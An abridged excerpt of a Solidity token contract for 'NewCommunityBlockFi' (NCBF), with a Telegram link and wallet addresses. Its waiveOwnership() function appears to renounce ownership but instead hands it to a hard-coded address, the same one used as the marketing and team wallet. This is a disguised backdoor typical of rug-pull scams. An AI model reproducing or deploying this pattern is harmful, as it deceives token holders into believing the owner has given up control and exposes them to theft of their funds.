...
/**
   BLOCK FI 
   hhttps://t.me/newcommunityBlockFiBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x43DE8916ECAacCc3b769Be1CF3db9fFC258843B8));
        _owner = address(0x43DE8916ECAacCc3b769Be1CF3db9fFC258843B8);
    }
...
contract NewCommunityBlockFi is Context, IERC20, Ownable {
    ...
    string private _name = "NewCommunityBlockFi";
    string private _symbol = "NCBF";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x43DE8916ECAacCc3b769Be1CF3db9fFC258843B8);
    address payable public teamWalletAddress = payable(0x43DE8916ECAacCc3b769Be1CF3db9fFC258843B8);
